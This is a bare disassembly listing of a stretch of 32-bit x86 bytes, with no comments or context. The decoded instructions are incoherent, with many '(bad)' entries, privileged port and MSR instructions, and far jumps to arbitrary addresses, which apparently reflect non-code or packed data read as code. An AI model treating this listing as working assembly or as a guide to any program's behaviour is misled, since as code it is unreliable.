  4129f4:	imul   ebx,DWORD PTR [ebx-0x17],0xffffffcf
  4129f8:	addr16 clc 
  4129fa:	pop    ecx
  4129fb:	push   0xffffffbc
  4129fd:	(bad)  [edi+edi*4]
  412a00:	daa    
  412a01:	and    ebx,eax
  412a03:	inc    esp
  412a04:	inc    DWORD PTR [edi+0x3c]
  412a07:	hlt    
  412a08:	mov    ds:0x8ea7af0e,al
  412a0d:	inc    edi
  412a0e:	push   0x7ceab652
  412a13:	shr    edx,1
  412a15:	add    DWORD PTR [ecx-0x46],edi
  412a18:	dec    ecx
  412a19:	scas   eax,DWORD PTR es:[edi]
  412a1a:	scas   al,BYTE PTR es:[edi]
  412a1b:	jnp    0x412a9c
  412a1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a1e:	mov    ds:0x6cefd90a,eax
  412a23:	dec    eax
  412a24:	aam    0x8c
  412a26:	mov    DWORD PTR [ebp+0x35b1c2a6],esi
  412a2c:	into   
  412a2d:	inc    ebp
  412a2e:	mov    esp,0xabc7688b
  412a33:	mov    esp,ss
  412a35:	scas   al,BYTE PTR es:[edi]
  412a36:	xchg   ebp,eax
  412a37:	mov    ?,edi
  412a39:	sub    bh,al
  412a3b:	aas    
  412a3c:	retf   0x99ff
  412a3f:	test   al,0x3b
  412a41:	(bad)  [esi]
  412a43:	in     al,dx
  412a44:	pop    ds
  412a45:	ja     0x412a12
  412a47:	std    
  412a48:	int    0x40
  412a4a:	cmp    ecx,DWORD PTR [ebx]
  412a4c:	jmp    0xce1b:0x31b50e4f
  412a53:	mov    al,0xe8
  412a55:	clc    
  412a56:	ret    0xf71e
  412a59:	out    dx,eax
  412a5a:	out    0x5e,al
  412a5c:	xor    esp,DWORD PTR [edi+0x65057f14]
  412a62:	fcomp  QWORD PTR [ecx-0x48]
  412a65:	rcl    DWORD PTR [esi-0x5e],cl
  412a68:	pop    es
  412a69:	push   ebx
  412a6a:	mov    esp,0x113d551b
  412a6f:	xor    esi,DWORD PTR gs:[edi+0x7a]
  412a73:	rcl    DWORD PTR [edi+edx*8-0x1ba8e4a8],1
  412a7a:	test   eax,0xddd79ae
  412a7f:	pop    edx
  412a80:	jbe    0x412a69
  412a82:	popf   
  412a83:	pusha  
  412a84:	iret   
  412a85:	in     eax,dx
  412a86:	sub    BYTE PTR [ebp+0x4410919e],cl
  412a8c:	aaa    
  412a8d:	xchg   DWORD PTR [ebp-0x1e52b726],ebx
  412a93:	das    
  412a94:	es sbb bh,dl
  412a97:	ja     0x412a24
  412a99:	in     eax,dx
  412a9a:	mov    ch,0x6d
  412a9c:	add    edi,eax
  412a9e:	inc    ebp
  412a9f:	mov    eax,ds
  412aa1:	xchg   ebp,eax
  412aa2:	sub    eax,0xc3af23e1
  412aa7:	ss wrmsr 
  412aaa:	pop    es
  412aab:	fiadd  DWORD PTR [eax+0x35280aa2]
  412ab1:	pop    edx
  412ab2:	aam    0xb9
  412ab4:	test   eax,0x3ba32172
  412ab9:	arpl   WORD PTR [ecx-0x1c42a6eb],sp
  412abf:	ins    DWORD PTR es:[edi],dx
  412ac0:	cmp    eax,0xae756922
  412ac5:	xchg   esi,eax
  412ac6:	frstor [eax-0x22]
  412ac9:	fsubr  QWORD PTR [ecx-0x7e16b5ec]
  412acf:	add    ch,al
  412ad1:	cmp    DWORD PTR [ebp-0x7e6b3883],esp
  412ad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ad8:	dec    esi
  412ad9:	popf   
  412ada:	add    BYTE PTR [ebp+0xd],dl
  412add:	or     ah,0xb7
  412ae0:	aam    0x4c
  412ae2:	sbb    edi,DWORD PTR [ebx]
  412ae4:	scas   eax,DWORD PTR es:[edi]
  412ae5:	jno    0x412b24
  412ae7:	(bad)  
  412ae8:	sub    BYTE PTR [edx],bl
  412aea:	jecxz  0x412b2d
  412aec:	test   DWORD PTR [ebx-0x4a908d5c],eax
  412af2:	push   edi
  412af3:	rol    DWORD PTR [edx+edi*8],1
  412af6:	xor    BYTE PTR [ecx+0x6b11e2f4],ch
  412afc:	push   edi
  412afd:	test   al,0xdc
  412aff:	sub    BYTE PTR [ecx+0x55],cl
  412b02:	cmovae ebx,esi
  412b05:	mov    cl,BYTE PTR [eax-0x5f4177c0]
  412b0b:	add    edx,DWORD PTR [ebx-0x1c898670]
  412b11:	push   es
  412b12:	sbb    eax,eax
  412b14:	sar    BYTE PTR [edi],0xb3
  412b17:	push   cs
  412b18:	add    edx,eax
  412b1a:	sbb    al,0x73
  412b1c:	add    BYTE PTR [esi],ah
  412b1e:	mov    DWORD PTR ds:0x90ec85d1,esp
  412b24:	add    DWORD PTR [ecx],edi
  412b26:	neg    eax
  412b28:	cmc    
  412b29:	dec    ecx
  412b2a:	cmc    
  412b2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b2c:	cmp    BYTE PTR [ecx+0x73],bh
  412b2f:	imul   edx,DWORD PTR [ebp+0x13],0xbd63b22b
  412b36:	sbb    al,0xf3
  412b38:	mov    esi,0x746a3bd4
  412b3d:	mov    dh,0x5c
  412b3f:	ins    DWORD PTR es:[edi],dx
  412b40:	addr16 in al,0xbd
  412b43:	adc    bl,BYTE PTR [ecx-0x32c8788c]
  412b49:	gs aad 0xf3
  412b4c:	push   edi
  412b4d:	mov    al,0xb
  412b4f:	int3   
  412b50:	sti    
  412b51:	mov    eax,ds:0xde767807
  412b56:	imul   esi,DWORD PTR [esi+ebx*8],0xfffffffd
  412b5a:	mov    eax,ds:0xef0c0159
  412b5f:	mov    eax,ds:0x36f191fa
  412b64:	xchg   BYTE PTR [ecx],al
  412b66:	daa    
  412b67:	add    esi,ebx
  412b69:	mov    esp,0x12011d3a
  412b6e:	mov    esi,0xce383953
  412b73:	fistp  DWORD PTR [ebx]
  412b75:	int    0x6a
  412b77:	jl     0x412b5a
  412b79:	(bad)  
  412b7b:	xchg   ecx,eax
  412b7c:	cmp    al,0xab
  412b7e:	out    dx,al
  412b7f:	int    0x4d
  412b81:	pop    edi
  412b82:	call   0x31791e96
  412b87:	inc    edx
  412b88:	stc    
  412b89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b8a:	cdq    
  412b8b:	ss mov esp,0x16f8c63c
  412b91:	xor    cl,BYTE PTR [ebx]
  412b93:	hlt    
  412b94:	mov    eax,es:0x356fb9b1
  412b9a:	cmp    bl,ah
  412b9c:	leave  
  412b9d:	push   0x5d
  412b9f:	dec    ecx
  412ba0:	pop    ds
  412ba1:	fs cli 
  412ba3:	inc    edi
  412ba4:	xor    edi,DWORD PTR [ebp-0x5b]
  412ba7:	sbb    al,BYTE PTR [esi+ebp*8+0x407a8928]
  412bae:	push   eax
  412baf:	jae    0x412c04
  412bb1:	push   ebp
  412bb2:	pop    ds
  412bb3:	xor    BYTE PTR [edi+0x1a],dh
  412bb6:	push   esp
  412bb7:	push   edx
  412bb8:	enter  0xc18c,0xa6
  412bbc:	adc    DWORD PTR [ecx-0x5f],edx
  412bbf:	xor    al,0x4
  412bc1:	sbb    al,0x60
  412bc3:	sub    eax,0xd2812100
  412bc8:	test   BYTE PTR [edx+esi*4+0x77],bh
  412bcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bcd:	xchg   edx,eax
  412bce:	jb     0x412bad
  412bd0:	ret    0x864d
  412bd3:	cwde   
  412bd4:	(bad)  
  412bd6:	ret    
  412bd7:	push   ss
  412bd8:	imul   ebp,DWORD PTR ds:0x4887ed14,0x57
  412bdf:	add    bh,bh
  412be1:	cwde   
  412be2:	mov    al,0xe0
  412be4:	xor    al,0xef
  412be6:	pusha  
  412be7:	pop    ds
  412be8:	(bad)  
  412bea:	outs   dx,DWORD PTR ds:[esi]
  412beb:	mov    al,ds:0x5d49560f
  412bf0:	sbb    BYTE PTR [ecx-0xd],0xd3
  412bf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bf5:	neg    BYTE PTR [ebx]
  412bf7:	xchg   ebp,eax
  412bf8:	outs   dx,DWORD PTR ds:[esi]
  412bf9:	jecxz  0x412c38
  412bfb:	mov    bl,0xbb
  412bfd:	pop    edx
  412bfe:	test   BYTE PTR [edi+0x4aa888ac],0x65
  412c05:	or     BYTE PTR [edx-0x6d4e64f8],dh
  412c0b:	stos   DWORD PTR es:[edi],eax
  412c0c:	test   BYTE PTR [eax-0x6a],bl
  412c0f:	out    dx,al
  412c10:	mov    edi,0xf003b417
  412c15:	pushf  
  412c16:	adc    BYTE PTR [esi-0xa],ah
  412c19:	jae    0x412c71
  412c1b:	xor    BYTE PTR [ecx-0x966a5f1],0x7e
  412c22:	jne    0x412c52
  412c24:	pusha  
  412c25:	iret   
  412c26:	mov    bl,0x44
  412c28:	sub    dh,BYTE PTR [ecx-0xe]
  412c2b:	shl    BYTE PTR [edi],1
  412c2d:	cmp    al,0x79
  412c2f:	sti    
  412c30:	cmp    esi,DWORD PTR [eax+0x73042400]
  412c36:	mov    ecx,0xa782d68b
  412c3b:	push   ss
  412c3c:	and    bh,dh
  412c3e:	icebp  
  412c3f:	cmp    bl,ch
  412c41:	call   0xa126:0xfd125a1d
  412c48:	dec    esi
  412c49:	mov    ebp,0xb9a56c59
  412c4e:	stos   BYTE PTR es:[edi],al
  412c4f:	outs   dx,BYTE PTR ds:[esi]
  412c50:	dec    DWORD PTR [esi]
  412c52:	or     BYTE PTR [ebx-0x29],bh
  412c55:	cmp    DWORD PTR [ecx-0x7283d2f8],ecx
  412c5b:	jecxz  0x412cb8
  412c5d:	fisub  DWORD PTR [ebx-0x60375ca0]
  412c63:	enter  0x8707,0x46
  412c67:	mov    edi,0xd7ff0e80
  412c6c:	adc    eax,0xb8a80acf
  412c71:	ds loope 0x412c5d
  412c74:	std    
  412c75:	dec    eax
  412c76:	arpl   dx,sp
  412c78:	xor    edx,ecx
  412c7a:	sbb    BYTE PTR [ecx-0x29a20cda],ah
  412c80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c81:	jnp    0x412cb7
  412c83:	fcomi  st,st(7)
  412c85:	dec    DWORD PTR [edx+ecx*8]
  412c88:	sub    eax,DWORD PTR [esp+eax*2]
  412c8b:	loope  0x412c6c
  412c8d:	mov    ch,al
  412c8f:	ds xchg esp,eax
  412c91:	test   al,0xf9
  412c93:	cmp    al,0xec
  412c95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c96:	mov    bh,0x16
  412c98:	les    edi,FWORD PTR [esi]
  412c9a:	push   eax
  412c9b:	fcmovne st,st(3)
  412c9d:	mov    bl,0xd
  412c9f:	xlat   BYTE PTR ds:[ebx]
  412ca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ca1:	nop
  412ca2:	cmp    al,0x6f
  412ca4:	sbb    BYTE PTR [eax+edi*8+0x1e],dh
  412ca8:	iret   
  412ca9:	outs   dx,DWORD PTR ds:[esi]
  412caa:	xchg   edx,eax
  412cab:	pop    ss
  412cac:	jl     0x412d09
  412cae:	(bad)  
  412caf:	push   ds
  412cb0:	mov    WORD PTR [eax-0x17a97ecf],ds
  412cb6:	sar    ah,cl
  412cb8:	dec    ecx
  412cb9:	mov    ecx,0x5397491a
  412cbe:	dec    esp
  412cbf:	call   0xcb6b:0x7f4ff493
  412cc6:	ret    
  412cc7:	sub    dl,BYTE PTR fs:[edx]
  412cca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ccb:	out    dx,al
  412ccc:	inc    esp
  412ccd:	inc    esp
  412cce:	cmp    ch,ah
  412cd0:	add    al,0x83
  412cd2:	add    esp,DWORD PTR [eax]
  412cd4:	dec    esi
  412cd5:	cmp    al,0xc6
  412cd7:	jo     0x412d30
  412cd9:	popa   
  412cda:	pop    ecx
  412cdb:	sub    DWORD PTR [ebx],esp
  412cdd:	les    ebx,FWORD PTR [ecx+0x2b]
  412ce0:	repnz cmp eax,0xeed9513c
  412ce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ce7:	cld    
  412ce8:	and    eax,0x3d0c285e
  412ced:	push   0x77
  412cef:	inc    eax
  412cf0:	jle    0x412c98
  412cf2:	and    eax,0xcedd95eb
  412cf7:	ins    DWORD PTR es:[edi],dx
  412cf8:	push   eax
  412cf9:	bound  ecx,QWORD PTR [eax]
  412cfb:	xchg   edx,eax
  412cfc:	cmp    eax,DWORD PTR [edi-0x56]
  412cff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d00:	(bad)  
  412d01:	les    ebx,FWORD PTR [eax+0x2e]
  412d04:	xchg   ecx,eax
  412d05:	adc    eax,esi
  412d07:	mov    ebp,0xe0490833
  412d0c:	imul   eax,DWORD PTR [eax-0x76],0xf42bdcf8
  412d13:	and    eax,0x191232d1
  412d18:	jge    0x412cc5
  412d1a:	mov    esp,0x108cf7c8
  412d1f:	jno    0x412d74
  412d21:	loope  0x412da0
  412d23:	pop    ecx
  412d24:	jne    0x412cd0
  412d26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d27:	dec    esi
  412d28:	push   edx
  412d29:	xchg   ebp,eax
  412d2a:	(bad)  
  412d2b:	or     ecx,DWORD PTR [edi]
  412d2d:	and    ecx,ebp
  412d2f:	daa    
  412d30:	fdivp  st(7),st
  412d32:	retf   
  412d33:	xchg   BYTE PTR [ecx+eiz*1+0x4a992a50],ch
  412d3a:	mov    al,ds:0xc5377e92
  412d3f:	jecxz  0x412dbe
  412d41:	push   esp
  412d42:	rcl    bl,0x9
  412d45:	or     ebp,esp
  412d47:	or     BYTE PTR [ebx-0x4d31ae43],ch
  412d4d:	jbe    0x412cdc
  412d4f:	lods   eax,DWORD PTR ds:[esi]
  412d50:	push   DWORD PTR [ebx+0xb]
  412d53:	(bad)  
  412d55:	aad    0x7f
  412d57:	or     eax,0x6d73299
  412d5c:	arpl   WORD PTR [eax+0xc],si
  412d5f:	ret    0x9930
  412d62:	push   ss
  412d63:	fisttp DWORD PTR [edx]
  412d65:	sub    BYTE PTR [edx+0x4b],cl
  412d68:	inc    esi
  412d69:	in     al,0x95
  412d6b:	ror    BYTE PTR [edi-0x61df5c7a],1
  412d71:	addr16 stc 
  412d73:	dec    esi
  412d74:	(bad)  
  412d75:	in     al,dx
  412d76:	inc    edi
  412d77:	neg    BYTE PTR [eax+0x24]
  412d7a:	jge    0x412dcd
  412d7c:	cli    
  412d7d:	mov    al,0x62
  412d7f:	and    eax,0x2b98cf4f
  412d84:	fldz   
  412d86:	fbstp  TBYTE PTR [esi+0x14]
  412d89:	and    eax,0xdfdd698e
  412d8e:	sub    ebx,DWORD PTR [edx-0x604c661a]
  412d94:	push   0xffffffe6
  412d96:	stc    
  412d97:	idiv   BYTE PTR [ebx]
  412d99:	test   al,0xd0
  412d9b:	xchg   esp,eax
  412d9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d9d:	imul   eax,DWORD PTR [esi+0x32],0xfffffffe
  412da1:	sbb    BYTE PTR [eax-0xa],bl
  412da4:	les    ebx,FWORD PTR ss:[edi+0x3aa79890]
  412dab:	sbb    al,0x8a
  412dad:	sub    ebx,ecx
  412daf:	cmp    eax,DWORD PTR [ebp+0x4f5b3320]
  412db5:	aas    
  412db6:	popa   
  412db7:	aas    
  412db8:	push   0xffffffad
  412dba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dbb:	push   esi
  412dbc:	stos   BYTE PTR es:[edi],al
  412dbd:	sub    ch,BYTE PTR [eax]
  412dbf:	mov    al,0x91
  412dc1:	bound  ebx,QWORD PTR [ebx+eiz*2+0xe7bf1be]
  412dc8:	jl     0x412e26
  412dca:	arpl   si,si
  412dcc:	mov    ds,WORD PTR [ebp+ecx*2+0x3b9e779f]
  412dd3:	out    0x16,al
  412dd5:	or     DWORD PTR [edx-0x38],esi
  412dd8:	mov    edx,0x8920b7c0
  412ddd:	xchg   BYTE PTR [eax],al
  412ddf:	lea    ebx,[eax-0x1b]
  412de2:	call   0x9403a978
  412de7:	mov    eax,DWORD PTR [edx-0x57]
  412dea:	push   edx
  412deb:	das    
  412dec:	cmp    DWORD PTR [esi],esp
  412dee:	or     esp,ebp
  412df0:	stc    
  412df1:	adc    BYTE PTR ds:0xf878116f,al
  412df7:	ds pop ss
  412df9:	cli    
  412dfa:	jae    0x412e11
  412dfc:	mov    al,0x85
  412dfe:	xchg   ebp,eax
  412dff:	lods   al,BYTE PTR ds:[esi]
  412e00:	mov    eax,0x443d754e
  412e05:	fmul   QWORD PTR [ecx]
  412e07:	jnp    0x412e56
  412e09:	cmp    edx,DWORD PTR [eax-0xb264a98]
  412e0f:	cmp    eax,0x7a9ab5e0
  412e14:	add    DWORD PTR [ebx],ebp
  412e16:	sub    esi,DWORD PTR [eax]
  412e18:	mov    dl,0xfc
  412e1a:	icebp  
  412e1b:	and    ebx,ecx
  412e1d:	sbb    ebx,DWORD PTR [ecx+ebp*1-0x51a4af7c]
  412e24:	addr16 push ecx
  412e26:	push   esp
  412e27:	jae    0x412e6e
  412e29:	jnp    0x412e98
  412e2b:	pushf  
  412e2c:	pop    ebx
  412e2d:	sbb    al,0x25
  412e2f:	enter  0x775e,0x48
  412e33:	mov    al,0x43
  412e35:	scas   eax,DWORD PTR es:[edi]
  412e36:	int3   
  412e37:	pop    ss
  412e38:	xor    bl,bl
  412e3a:	cmp    dl,ch
  412e3c:	(bad)  
  412e3e:	add    DWORD PTR [ecx+0x12],ebx
  412e41:	push   esp
  412e42:	add    al,0xc8
  412e44:	mov    dh,0xa1
  412e46:	pop    esp
  412e47:	add    eax,0x474b81aa
  412e4c:	fisubr DWORD PTR ds:0xd967cde2
  412e52:	pop    edi
  412e53:	and    BYTE PTR [edi-0xf],ah
  412e56:	xlat   BYTE PTR ds:[ebx]
  412e57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e58:	mov    ebx,0x94cf1d6c
  412e5d:	test   BYTE PTR [ebp+0x6ba10b43],dh
  412e63:	pop    ebp
  412e64:	lds    edx,FWORD PTR gs:[eax]
  412e67:	push   0xffffffe4
  412e69:	mov    esp,0x4b66679a
  412e6e:	retf   0x98dd
  412e71:	out    0xb4,eax
  412e73:	in     eax,0x52
  412e75:	rcl    BYTE PTR [esi],cl
  412e77:	js     0x412e90
  412e79:	push   ebp
  412e7a:	test   esp,ecx
  412e7c:	sbb    cl,BYTE PTR [edi-0x5d49eaa8]
  412e82:	loopne 0x412ec4
  412e84:	cs pusha 
  412e86:	sub    bl,BYTE PTR [ebp-0x38e7ab30]
  412e8c:	repnz mov edi,0x284a3fac
  412e92:	mov    ebp,0x721ffd68
  412e97:	inc    eax
  412e98:	out    dx,eax
  412e99:	sbb    DWORD PTR [esi-0x48],eax
  412e9c:	push   cs
  412e9d:	outs   dx,DWORD PTR ds:[esi]
  412e9e:	int3   
  412e9f:	pop    ds
  412ea0:	adc    ebp,DWORD PTR [edi]
  412ea2:	mov    al,0x24
  412ea4:	xchg   BYTE PTR [edi-0x5fa26a12],dh
  412eaa:	inc    esp
  412eab:	shr    BYTE PTR [eax+0x3],cl
  412eae:	xchg   esp,eax
  412eaf:	arpl   WORD PTR [ebp+0x18],sp
  412eb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eb3:	mov    cl,0xf3
  412eb5:	or     al,0xf1
  412eb7:	iret   
  412eb8:	call   0x25fe48f9
  412ebd:	jp     0x412ee1
  412ebf:	ins    DWORD PTR es:[edi],dx
  412ec0:	mov    eax,0xbdc58b31
  412ec5:	ret    
  412ec6:	rcl    BYTE PTR [ebp+edx*1-0x59],cl
  412eca:	loopne 0x412ec4
  412ecc:	dec    esi
  412ecd:	(bad)  
  412ece:	(bad)  
  412ecf:	mov    esp,0x654e09fa
  412ed4:	push   ecx
  412ed5:	aad    0x37
  412ed7:	dec    eax
  412ed8:	popa   
  412ed9:	mov    ch,0x71
  412edb:	enter  0x901,0x9a
  412edf:	data16 fstp QWORD PTR [ecx]
  412ee2:	push   esp
  412ee3:	scas   eax,DWORD PTR es:[edi]
  412ee4:	mov    ds:0x7a9094fa,al
  412ee9:	rcr    BYTE PTR [ebp-0x3d57069d],cl
  412eef:	jecxz  0x412f61
  412ef1:	lds    esp,FWORD PTR [edi-0x1db6ce35]
  412ef7:	fwait
  412ef8:	mov    dl,BYTE PTR [edi]
  412efa:	or     ecx,DWORD PTR [ebp+0x5b]
  412efd:	push   0x5bfeca69
  412f02:	pop    edx
  412f03:	int    0x2
  412f05:	repz retf 0xd25a
  412f09:	les    eax,FWORD PTR [edx+0x526f5b30]
  412f0f:	pop    ebp
  412f10:	adc    BYTE PTR [ecx-0x52],0x13
  412f14:	inc    edi
  412f15:	dec    eax
  412f16:	push   0xffffffbc
  412f18:	out    0xbf,al
  412f1a:	dec    esi
  412f1b:	inc    ebx
  412f1c:	push   ds
  412f1d:	sub    ecx,DWORD PTR [edx+0x5ad60093]
  412f23:	xor    DWORD PTR [esi+0x34bd5fbb],ebp
  412f29:	pop    ebx
  412f2a:	add    eax,0xf3ba7dc6
  412f2f:	cmp    al,0xe7
  412f31:	adc    DWORD PTR [edi+0x4fffaab8],0xd6460c2a
  412f3b:	mov    dh,0x1d
  412f3d:	and    DWORD PTR [edx],ebx
  412f3f:	rcl    DWORD PTR [ebx+0x769cdb1],1
  412f45:	mov    al,BYTE PTR [edi]
  412f47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f48:	cmc    
  412f49:	push   esp
  412f4a:	xor    edi,DWORD PTR [eax]
  412f4c:	push   esp
  412f4d:	jb     0x412f9e
  412f4f:	push   ds
  412f50:	push   0xd9cac251
  412f55:	push   ecx
  412f56:	out    dx,eax
  412f57:	xor    dl,bh
  412f59:	mov    esp,0x7e0a6046
  412f5e:	jae    0x412f90
  412f60:	cmp    eax,0xdb32f52b
  412f65:	mov    al,0x4a
  412f67:	or     esi,ecx
  412f69:	(bad)  
  412f6a:	lods   al,BYTE PTR ds:[esi]
  412f6b:	inc    edx
  412f6c:	test   al,0xab
  412f6e:	scas   eax,DWORD PTR es:[edi]
  412f6f:	and    eax,0x331fe850
  412f74:	mov    cl,0xff
  412f76:	adc    ecx,DWORD PTR [esi]
  412f78:	in     eax,0x81
  412f7a:	mov    esi,DWORD PTR [edx+esi*4+0x496b8719]
  412f81:	mov    bh,0xcb
  412f83:	add    ebx,DWORD PTR [esi-0x3a]
  412f86:	push   esi
  412f87:	xchg   bl,bl
  412f89:	jge    0x413008
  412f8b:	add    eax,0xed98b731
  412f90:	lahf   
  412f91:	add    BYTE PTR [edi],0x5f
  412f94:	mov    ecx,0xa564437
  412f99:	pop    ebp
  412f9a:	(bad)  
  412f9c:	mov    cl,0xfc
  412f9e:	pop    ds
  412f9f:	push   esp
  412fa0:	cmp    DWORD PTR [eax+esi*4-0x2f49d824],eax
  412fa7:	mov    DWORD PTR [eax],0x971609d0
  412fad:	and    esi,esi
  412faf:	imul   edx,DWORD PTR [eax+edx*2-0x4c4c07e1],0x9e2b96ed
  412fba:	inc    eax
  412fbb:	mov    cl,0xb6
  412fbd:	(bad)  
  412fbe:	gs xchg edx,eax
  412fc0:	or     al,0xb4
  412fc2:	fcomi  st,st(5)
  412fc4:	sbb    dl,bl
  412fc6:	test   BYTE PTR [eax+0x6f29f25d],bh
  412fcc:	les    eax,FWORD PTR [ecx+0x11da8242]
  412fd2:	retf   0xc772
  412fd5:	aam    0x46
  412fd7:	dec    ecx
  412fd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fd9:	inc    ecx
  412fda:	repnz cmp esp,edi
  412fdd:	pop    es
  412fde:	sbb    DWORD PTR [edi-0x27],edx
  412fe1:	xchg   ecx,eax
  412fe2:	or     eax,DWORD PTR [ebx+edi*8]
  412fe5:	inc    esp
  412fe6:	or     DWORD PTR [ebx+0x2c],eax
  412fe9:	shl    DWORD PTR [ecx+0x9],1
  412fec:	sub    BYTE PTR [edx-0x16],bl
  412fef:	sub    edx,DWORD PTR [ecx]
  412ff1:	int3   
  412ff2:	dec    ebx
  412ff3:	inc    eax
  412ff4:	push   esp
  412ff5:	call   0x9889:0xe6b1b926
  412ffc:	push   ebx
  412ffd:	push   esp
  412ffe:	in     eax,dx
  412fff:	inc    edi
  413000:	mov    ch,0xfe
  413002:	inc    eax
  413003:	retf   0xe31f
  413006:	pop    es
  413007:	and    edi,ebx
  413009:	sbb    BYTE PTR [edx],al
  41300b:	push   es
  41300c:	or     ah,0x74
  41300f:	and    esi,esi
  413011:	icebp  
  413012:	jmp    0xfb680d2
  413017:	mov    esp,0x96e18eb6
  41301c:	jb     0x412fbc
  41301e:	jne    0x412fbf
  413020:	sbb    eax,0x2be68976
  413025:	mov    DWORD PTR [esi],esi
  413027:	inc    eax
  413028:	add    DWORD PTR [ebp+0x61],edx
  41302b:	arpl   WORD PTR ds:0x54f66ce0,sp
  413031:	pushf  
  413032:	dec    edi
  413033:	(bad)  
  413034:	out    0x17,eax
  413036:	daa    
  413037:	sbb    DWORD PTR [eax+0x66],ecx
  41303a:	xchg   ecx,eax
  41303b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41303c:	mov    ecx,0xe93de013
  413041:	sar    BYTE PTR [ebp+ebp*2-0x189f8772],cl
  413048:	inc    ebp
  413049:	cdq    
  41304a:	lds    edx,FWORD PTR [ecx-0x74b36e18]
  413050:	sub    eax,0xa0b0354
  413055:	popf   
  413056:	mov    al,ds:0xb0999f9d
  41305b:	adc    al,0x5c
  41305d:	mov    esi,0x8ddd424e
  413062:	(bad)  
  413063:	mov    eax,0x5ea7067
  413068:	adc    BYTE PTR [ebx-0x19],dl
  41306b:	or     dl,BYTE PTR [ebx]
  41306d:	loope  0x41306b
  41306f:	pop    esi
  413070:	dec    ecx
  413071:	dec    ecx
  413072:	dec    ebx
  413073:	into   
  413074:	mov    edx,0x4827ae54
  413079:	push   0xd8ed6946
  41307e:	(bad)  
  41307f:	sbb    DWORD PTR ds:[edx+0x622b6ac7],edi
  413086:	jnp    0x413039
  413088:	and    BYTE PTR [edx+0xb86a242],al
  41308e:	pop    ss
  41308f:	inc    esi
  413090:	push   0xe4c1555c
  413095:	dec    esp
  413096:	adc    esp,DWORD PTR [eax+0x67]
  413099:	sub    BYTE PTR [eax-0x36],ch
  41309c:	lods   al,BYTE PTR ds:[esi]
  41309d:	dec    ecx
  41309e:	pusha  
  41309f:	pop    ebp
  4130a0:	jbe    0x4130f8
  4130a2:	fcmovnu st,st(2)
  4130a4:	and    eax,0x18e49cde
  4130a9:	cwde   
  4130aa:	add    ah,dh
  4130ac:	and    al,0x9
  4130ae:	pop    ebp
  4130af:	push   eax
  4130b0:	dec    edx
  4130b1:	or     BYTE PTR [eax+0x78],cl
  4130b4:	loop   0x4130c7
  4130b6:	mov    edx,0xb5db92a0
  4130bb:	mov    ch,cl
  4130bd:	push   esp
  4130be:	shr    BYTE PTR [esi],0x34
  4130c1:	test   al,0x34
  4130c3:	and    al,0xb7
  4130c5:	fs aad 0x38
  4130c8:	dec    edx
  4130c9:	ja     0x4130e0
  4130cb:	ret    
  4130cc:	mov    eax,ds:0x18f2b01c
  4130d1:	dec    eax
  4130d2:	mov    ds,WORD PTR [ebp+0x7d]
  4130d5:	sti    
  4130d6:	or     DWORD PTR [edi+0x55],edx
  4130d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130da:	mov    ?,WORD PTR [esi-0x44]
  4130dd:	sar    BYTE PTR [eax+0x10],1
  4130e0:	cdq    
  4130e1:	dec    ecx
  4130e2:	arpl   WORD PTR [ebp+ebx*4-0x5a],dx
  4130e6:	repz enter 0xbf02,0x82
  4130eb:	push   ds
  4130ec:	test   DWORD PTR [edx+0x5c],0x8e00bb31
  4130f3:	fidiv  DWORD PTR [esi]
  4130f5:	jbe    0x413112
  4130f7:	push   cs
  4130f8:	xchg   BYTE PTR [esp+ebp*2-0x61],cl
  4130fc:	inc    eax
  4130fd:	mov    al,ds:0x4fbdb8ce
  413102:	push   0x51
  413104:	in     al,0x18
  413106:	in     eax,dx
  413107:	call   0xcef9d3fa
  41310c:	or     eax,0x79ae15ce
  413111:	jo     0x4130c5
  413113:	cmp    al,0x39
  413115:	ror    BYTE PTR [ecx+0x62],cl
  413118:	lock into 
  41311a:	std    
  41311b:	in     al,dx
  41311c:	js     0x41319a
  41311e:	inc    esp
  41311f:	int3   
  413120:	aas    
  413121:	cmp    al,0x91
  413123:	cmp    al,0x8f
  413125:	(bad)  
  413126:	pop    ebx
  413127:	icebp  
  413128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413129:	jp     0x413155
  41312b:	jmp    DWORD PTR [edx+0x2]
  41312e:	mov    ebx,0x2bfdc1f5
  413133:	mov    al,0xcd
  413135:	mov    DWORD PTR [ebx+0x6f403ba9],ebx
  41313b:	sbb    ch,0x50
  41313e:	(bad)  
  41313f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413140:	outs   dx,DWORD PTR ds:[esi]
  413141:	sub    eax,0x27dd7e62
  413146:	dec    esp
  413147:	mov    ch,0xc7
  413149:	bound  ebx,QWORD PTR [eax+0x2839baf9]
  41314f:	arpl   WORD PTR [edx+eiz*4+0x416ec688],dx
  413156:	push   esp
  413157:	jae    0x413141
  413159:	add    cl,BYTE PTR [ebp-0x313550c7]
  41315f:	sti    
  413160:	popf   
  413161:	mov    ebx,0xa5d349e4
  413166:	sbb    ah,BYTE PTR [ecx-0xa]
  413169:	(bad)  
  41316a:	sbb    al,0x8c
  41316c:	add    ebx,ebp
  41316e:	arpl   WORD PTR [esi-0x30],sp
  413171:	and    eax,0x65a9c914
  413176:	sti    
  413177:	addr16 sub ah,bh
